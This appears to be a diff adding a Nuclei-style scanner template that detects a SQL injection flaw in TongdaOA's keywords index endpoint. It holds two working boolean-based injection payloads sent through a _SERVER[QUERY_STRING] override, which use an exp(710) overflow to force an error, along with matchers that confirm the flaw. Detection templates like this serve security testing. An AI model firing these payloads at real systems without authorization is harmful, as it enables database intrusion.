@@ -1,0 +1,43 @@
+id: poc-yaml-tongda-setting-keywords-sqli
+info:
+  name: TongdaOA Keywords Index SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in TongdaOA application at the /general/document/index.php/setting/keywords/index endpoint.
+http:
+  - raw:
+      - |
+        POST /general/document/index.php/setting/keywords/index HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _SERVER[QUERY_STRING]=kname=1'+and@`'`+or+if(1=1,1,exp(710))#
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "主题词管理"
+          - "确认要批量删除吗"
+        condition: or
+  - raw:
+      - |
+        POST /general/document/index.php/setting/keywords/index HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _SERVER[QUERY_STRING]=kname=1'+and@`'`+or+if(1=0,1,exp(710))#
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "SQL语句执行错误"
+          - "文件"
+        condition: or
